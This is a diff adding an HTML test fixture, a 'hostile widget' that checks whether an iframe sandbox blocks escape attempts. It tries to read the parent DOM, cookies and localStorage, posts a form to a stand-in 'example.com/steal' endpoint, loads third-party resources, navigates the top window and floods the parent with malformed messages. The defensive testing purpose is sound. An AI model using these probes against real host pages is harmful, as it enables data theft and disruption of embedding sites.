@@ -1,0 +1,133 @@
+<main style="font:14px system-ui;padding:8px">
+  <h1 style="font-size:16px">Hostile widget</h1>
+  <p id="out">running…</p>
+</main>
+<img id="probe-img" alt="" width="1" height="1" />
+<form id="probe-form" action="https://example.com/steal" method="post" target="_top">
+  <input name="x" value="1" />
+</form>
+<script>
+  // Every attack below must fail. Each result is reported to the page that hosts
+  // this widget (mock-host/widget-test.html), which checks the answers against
+  // what it knows it did not leak.
+  var results = []
+  var violations = []
+  document.addEventListener('securitypolicyviolation', function (event) {
+    violations.push(event.violatedDirective + ' ' + event.blockedURI)
+  })
+
+  function report(test, escaped, detail) {
+    results.push({ test: test, escaped: escaped, detail: String(detail).slice(0, 160) })
+  }
+
+  function attempt(test, fn) {
+    try {
+      var value = fn()
+      return value
+    } catch (error) {
+      report(test, false, 'threw ' + (error && error.name))
+      return undefined
+    }
+  }
+
+  // 1. Read the parent's DOM.
+  attempt('read parent DOM', function () {
+    var title = parent.document.title
+    report('read parent DOM', true, 'read title: ' + title)
+  })
+
+  // 2. localStorage.
+  attempt('localStorage', function () {
+    var value = localStorage.getItem('secret')
+    report('localStorage', true, 'read: ' + value)
+  })
+
+  // 3. document.cookie.
+  attempt('document.cookie', function () {
+    var value = document.cookie
+    // An opaque origin may not touch cookies at all; an empty read is not a leak,
+    // but it must not contain the host's cookie.
+    report('document.cookie', /sess=hostsecret/.test(value), 'read: "' + value + '"')
+  })
+
+  // 4. fetch / XHR to anywhere, including the host's own origin.
+  var pending = 0
+  function done() {
+    pending--
+    if (pending === 0) finish()
+  }
+  pending++
+  fetch('/mock-host/widget-test.html')
+    .then(function () { report('fetch', true, 'fetch resolved') })
+    .catch(function (error) { report('fetch', false, 'rejected ' + (error && error.name)) })
+    .then(done)
+  pending++
+  try {
+    var xhr = new XMLHttpRequest()
+    xhr.open('GET', 'https://example.com/')
+    xhr.onload = function () { report('XHR', true, 'status ' + xhr.status); done() }
+    xhr.onerror = function () { report('XHR', false, 'error event'); done() }
+    xhr.send()
+  } catch (error) {
+    report('XHR', false, 'threw ' + (error && error.name))
+    done()
+  }
+
+  // 5. Navigate the top window.
+  attempt('navigate top', function () {
+    top.location.href = 'https://example.com/'
+    report('navigate top', true, 'assignment did not throw')
+  })
+
+  // 6. Open a window.
+  attempt('window.open', function () {
+    var opened = window.open('https://example.com/', '_blank')
+    report('window.open', opened !== null && opened !== undefined, opened ? 'got a window' : 'null')
+  })
+
+  // 7. Submit a form (also aimed at the top window).
+  attempt('form submit', function () {
+    document.getElementById('probe-form').submit()
+    report('form submit', false, 'submit() returned; blocked by sandbox and form-action none')
+  })
+
+  // 8. Load a third-party script and image.
+  pending++
+  var script = document.createElement('script')
+  script.src = 'https://example.com/third-party.js'
+  script.onload = function () { report('third-party script', true, 'loaded'); done() }
+  script.onerror = function () { report('third-party script', false, 'load error'); done() }
+  document.head.appendChild(script)
+  pending++
+  var img = document.getElementById('probe-img')
+  img.onload = function () { report('third-party image', true, 'loaded'); done() }
+  img.onerror = function () { report('third-party image', false, 'load error'); done() }
+  img.src = 'https://example.com/pixel.png'
+
+  // 9. Flood the parent with oversized and malformed messages.
+  attempt('postMessage flood', function () {
+    var big = 'x'.repeat(2 * 1024 * 1024)
+    var shapes = [
+      null,
+      'close',
+      [],
+      { source: 'rumbos-widget' },
+      { source: 'rumbos-widget', type: 'setHeight', height: 'tall' },
+      { source: 'rumbos-widget', type: 'setHeight', height: 1e12 },
+      { source: 'rumbos-widget', type: 'close', padding: big },
+      { source: 'rumbos-widget', type: 'navigate', url: 'https://example.com' },
+      { type: 'rumbos:open-activity', v: 1, cmid: 1 },
+      { type: 'rumbos:error', v: 1, code: 'launch_failed' },
+    ]
+    for (var i = 0; i < 3000; i++) parent.postMessage(shapes[i % shapes.length], '*')
+    report('postMessage flood', false, 'sent 3000 messages; the parent must stay responsive')
+  })
+
+  function finish() {
+    parent.postMessage({ hostile: true, results: results, violations: violations }, '*')
+    document.getElementById('out').textContent = 'done: ' + results.length + ' results'
+  }
+  if (pending === 0) finish()
+  // The network attempts may never settle in some engines; report anyway.
+  setTimeout(finish, 4000)
+</script>
